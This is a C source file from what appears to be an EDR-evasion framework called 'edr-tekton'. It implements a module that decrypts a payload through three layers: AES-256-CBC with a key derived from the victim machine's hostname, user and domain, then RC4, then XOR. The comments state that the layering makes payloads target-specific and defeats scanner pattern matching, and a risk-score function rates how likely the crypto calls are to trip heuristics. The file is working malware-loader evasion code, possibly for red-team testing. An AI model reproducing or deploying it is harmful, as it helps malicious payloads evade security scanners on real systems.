/*
 * edr-tekton :: Triple Encryption Module
 * Cat 3.4: Layered AES-256 + RC4 + XOR decryption
 *
 * Defense-in-depth encryption architecture:
 *   Layer 1 (outer): AES-256-CBC with environment key
 *   Layer 2 (middle): RC4 with separate key
 *   Layer 3 (inner): XOR with short key
 *
 * Each layer uses different key derivation:
 *   - AES key: derived from machine env (hostname+user+domain) via
 *     FNV-1a stretching, makes payload target-specific
 *   - RC4 key: derived from custom seed or static, different material
 *   - XOR key: fast inner layer, can use static key
 *
 * Decryption order: AES (peel outer) -> RC4 (peel middle) -> XOR (peel inner)
 * Encryption order: XOR (apply inner) -> RC4 (apply middle) -> AES (apply outer)
 *
 * Result: ~6.4 bits/byte entropy (near-random), defeats pattern
 * matching at each layer independently.
 */

#include "tekton/modules/encrypt.h"
#include "tekton/util/crypto.h"
#include "tekton/core/log.h"
#include <string.h>
#include <stdlib.h>

/* ── Internal state ─────────────────────────────────────── */

typedef struct _TRIPLE_MODULE_STATE {
    /* Per-layer key sources */
    TEKTON_KEY_SOURCE   aes_key_source;
    TEKTON_KEY_SOURCE   rc4_key_source;

    /* Key material */
    BYTE                aes_key[TEKTON_AES_KEY_SIZE];
    BYTE                aes_iv[TEKTON_AES_IV_SIZE];
    BYTE                rc4_key[32];
    SIZE_T              rc4_key_len;
    BYTE                xor_key[16];
    SIZE_T              xor_key_len;

    /* Custom seeds */
    char                aes_seed[256];
    char                rc4_seed[256];

    /* Crypto contexts */
    TEKTON_TRIPLE_CTX   triple_ctx;
    BOOL                initialized;
} TRIPLE_MODULE_STATE;

/* ── Module vtable implementation ───────────────────────── */

static TEKTON_STATUS triple_init(PTEKTON_MODULE self, PTEKTON_CONTEXT ctx) {
    (void)ctx;

    TRIPLE_MODULE_STATE* state = (TRIPLE_MODULE_STATE*)malloc(sizeof(TRIPLE_MODULE_STATE));
    if (!state) return TEKTON_ERR_ALLOC;

    memset(state, 0, sizeof(*state));

    /* Default: AES from env, RC4 static, XOR static */
    state->aes_key_source = TEKTON_KEY_ENV;
    state->rc4_key_source = TEKTON_KEY_STATIC;

    /* Default IV */
    static const BYTE default_iv[TEKTON_AES_IV_SIZE] = {
        0x10, 0x11, 0x12, 0x13, 0x14, 0x15, 0x16, 0x17,
        0x18, 0x19, 0x1A, 0x1B, 0x1C, 0x1D, 0x1E, 0x1F
    };
    memcpy(state->aes_iv, default_iv, TEKTON_AES_IV_SIZE);

    /* Default RC4 key (overridden by config) */
    static const BYTE default_rc4[] = {
        0x72, 0x63, 0x34, 0x5F, 0x6C, 0x61, 0x79, 0x65,
        0x72, 0x5F, 0x32, 0x5F, 0x6B, 0x65, 0x79, 0x21
    };
    memcpy(state->rc4_key, default_rc4, sizeof(default_rc4));
    state->rc4_key_len = sizeof(default_rc4);

    /* Default XOR key (overridden by config) */
    static const BYTE default_xor[] = {
        0xDE, 0xAD, 0xBE, 0xEF, 0xCA, 0xFE, 0xBA, 0xBE,
        0x13, 0x37, 0x42, 0x69, 0xAA, 0xBB, 0xCC, 0xDD
    };
    memcpy(state->xor_key, default_xor, sizeof(default_xor));
    state->xor_key_len = sizeof(default_xor);

    self->private_data = state;

    TLOG_DEBUG("encrypt_triple: init (aes=env, rc4=static, xor=static)");
    return TEKTON_OK;
}

static TEKTON_STATUS triple_derive_keys(TRIPLE_MODULE_STATE* state) {
    TEKTON_STATUS status;

    /* Derive AES key */
    switch (state->aes_key_source) {
    case TEKTON_KEY_ENV:
        status = TektonCryptoDeriveEnvKey(state->aes_key, TEKTON_AES_KEY_SIZE, NULL);
        if (status != TEKTON_OK) {
            TLOG_ERROR("encrypt_triple: AES env key derivation failed");
            return status;
        }
        TLOG_DEBUG("encrypt_triple: AES key from machine env");
        break;

    case TEKTON_KEY_DERIVED:
        status = TektonCryptoDeriveEnvKey(
            state->aes_key, TEKTON_AES_KEY_SIZE,
            state->aes_seed[0] ? state->aes_seed : NULL
        );
        if (status != TEKTON_OK) return status;
        TLOG_DEBUG("encrypt_triple: AES key from custom seed");
        break;

    case TEKTON_KEY_STATIC:
        TLOG_DEBUG("encrypt_triple: AES key static");
        break;

    default:
        return TEKTON_ERR_INVALID_PARAM;
    }

    /* Derive RC4 key if env-sourced */
    if (state->rc4_key_source == TEKTON_KEY_ENV) {
        /*
         * Use a different seed than AES to ensure distinct keys.
         * Append ":rc4" to the env string before derivation.
         */
        status = TektonCryptoDeriveEnvKey(
            state->rc4_key, 16,
            state->rc4_seed[0] ? state->rc4_seed : "rc4-layer"
        );
        if (status != TEKTON_OK) {
            TLOG_ERROR("encrypt_triple: RC4 env key derivation failed");
            return status;
        }
        state->rc4_key_len = 16;
        TLOG_DEBUG("encrypt_triple: RC4 key from env");
    } else if (state->rc4_key_source == TEKTON_KEY_DERIVED) {
        status = TektonCryptoDeriveEnvKey(
            state->rc4_key, 16,
            state->rc4_seed[0] ? state->rc4_seed : NULL
        );
        if (status != TEKTON_OK) return status;
        state->rc4_key_len = 16;
    }

    return TEKTON_OK;
}

static TEKTON_STATUS triple_execute(PTEKTON_MODULE self, PTEKTON_CONTEXT ctx) {
    TRIPLE_MODULE_STATE* state = (TRIPLE_MODULE_STATE*)self->private_data;
    if (!state) return TEKTON_ERR_INVALID_STATE;

    if (ctx->dry_run) {
        TLOG_INFO("encrypt_triple: [DRY RUN] would triple-decrypt payload (%lu bytes)",
            (unsigned long)ctx->payload.length);
        TLOG_INFO("  Layer 1: AES-256-CBC (key_source=%d)", state->aes_key_source);
        TLOG_INFO("  Layer 2: RC4 (key_source=%d)", state->rc4_key_source);
        TLOG_INFO("  Layer 3: XOR (key_len=%lu)", (unsigned long)state->xor_key_len);
        return TEKTON_OK;
    }

    /* Step 1: Derive all keys */
    if (!state->initialized) {
        TEKTON_STATUS ks = triple_derive_keys(state);
        if (ks != TEKTON_OK) return ks;

        /* Initialize the triple context */
        ks = TektonCryptoTripleInit(
            &state->triple_ctx,
            state->aes_key,  TEKTON_AES_KEY_SIZE,
            state->rc4_key,  state->rc4_key_len,
            state->xor_key,  state->xor_key_len,
            state->aes_iv
        );
        if (ks != TEKTON_OK) {
            TLOG_ERROR("encrypt_triple: context init failed");
            return ks;
        }

        state->initialized = TRUE;
    }

    /* Step 2: Validate payload */
    if (!ctx->payload.data || ctx->payload.length == 0) {
        TLOG_ERROR("encrypt_triple: no payload to decrypt");
        return TEKTON_ERR_INVALID_PARAM;
    }

    if (ctx->payload.length % TEKTON_AES_BLOCK_SIZE != 0) {
        TLOG_ERROR("encrypt_triple: payload not block-aligned (AES outer layer requires it)");
        return TEKTON_ERR_INVALID_PARAM;
    }

    /* Step 3: Allocate decrypted buffer */
    if (!ctx->decrypted.data) {
        ctx->decrypted.data = (BYTE*)malloc(ctx->payload.length);
        if (!ctx->decrypted.data) return TEKTON_ERR_ALLOC;
        ctx->decrypted.capacity = ctx->payload.length;
    } else if (ctx->decrypted.capacity < ctx->payload.length) {
        TLOG_ERROR("encrypt_triple: decrypted buffer too small");
        return TEKTON_ERR_ALLOC;
    }

    memcpy(ctx->decrypted.data, ctx->payload.data, ctx->payload.length);
    ctx->decrypted.length = ctx->payload.length;

    /* Step 4: Triple decrypt (AES -> RC4 -> XOR) */
    TEKTON_STATUS status = TektonCryptoTripleDecrypt(
        &state->triple_ctx,
        ctx->decrypted.data,
        &ctx->decrypted.length
    );
    if (status != TEKTON_OK) {
        TLOG_ERROR("encrypt_triple: decryption failed at one of the layers");
        return status;
    }

    TLOG_INFO("encrypt_triple: decrypted %lu bytes through 3 layers",
        (unsigned long)ctx->decrypted.length);
    TLOG_DEBUG("  AES-256-CBC -> RC4 -> XOR (peeled outer to inner)");

    return TEKTON_OK;
}

static VOID triple_cleanup(PTEKTON_MODULE self) {
    if (self->private_data) {
        TRIPLE_MODULE_STATE* state = (TRIPLE_MODULE_STATE*)self->private_data;
        TEKTON_SECURE_ZERO(state, sizeof(TRIPLE_MODULE_STATE));
        free(state);
        self->private_data = NULL;
    }
}

static DWORD triple_risk_score(PTEKTON_MODULE self) {
    (void)self;
    /*
     * Slightly higher than single-layer: multiple crypto operations
     * in sequence could trigger heuristic patterns, but the individual
     * primitives are all common and benign-looking.
     */
    return 10;
}

static BOOL triple_check_compat(PTEKTON_MODULE self, PTEKTON_CONTEXT ctx) {
    (void)self;
    (void)ctx;
    /* All crypto is self-contained, works everywhere */
    return TRUE;
}

/* ── Module definition + auto-registration ──────────────── */

TEKTON_MODULE tekton_mod_encrypt_triple = {
    .name           = "encrypt_triple",
    .description    = "Triple encryption: AES-256 + RC4 + XOR layered (Cat 3.4)",
    .category       = TEKTON_CAT_ENCRYPT,
    .target_surface = TEKTON_SURFACE_SCANNER,
    .flags          = 0,
    .skill_ref      = "3.4",
    .init           = triple_init,
    .execute        = triple_execute,
    .cleanup        = triple_cleanup,
    .get_risk_score = triple_risk_score,
    .check_compat   = triple_check_compat,
    .private_data   = NULL,
    .next           = NULL,
};

TEKTON_DECLARE_MODULE(tekton_mod_encrypt_triple);
